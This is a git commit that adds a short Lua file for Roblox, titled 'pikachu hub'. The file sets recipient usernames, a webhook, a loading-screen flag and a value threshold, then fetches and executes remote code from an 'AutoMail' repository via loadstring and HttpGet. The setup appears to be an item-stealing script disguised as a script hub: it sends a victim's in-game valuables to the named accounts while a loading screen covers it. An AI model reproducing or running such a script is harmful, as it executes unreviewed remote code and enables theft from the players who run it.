029f95c7a3fea17bad4f0f43fbd3a89516261bf5
pikachu1213ed <160391306+pikachu1213ed@users.noreply.github.com>
2024-02-18 16:41:04 +0700

    pikachu hub

---
+++ obf_UZvdy1O5idtt86q17rBJFDPSJF8om0vML65pk42ovTa12Nv0x7unikkE184Yq3w2.lua
@@ -0,0 +1,10 @@
+Username = " pikachu352783 "
+Username2 = " pikachu352783 "
+Webhook = " loading "
+
+LoadingScreen = true
+
+MinimumRAP = 1e+24
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HubPet99/AutoMail/main/Mail"))()
+
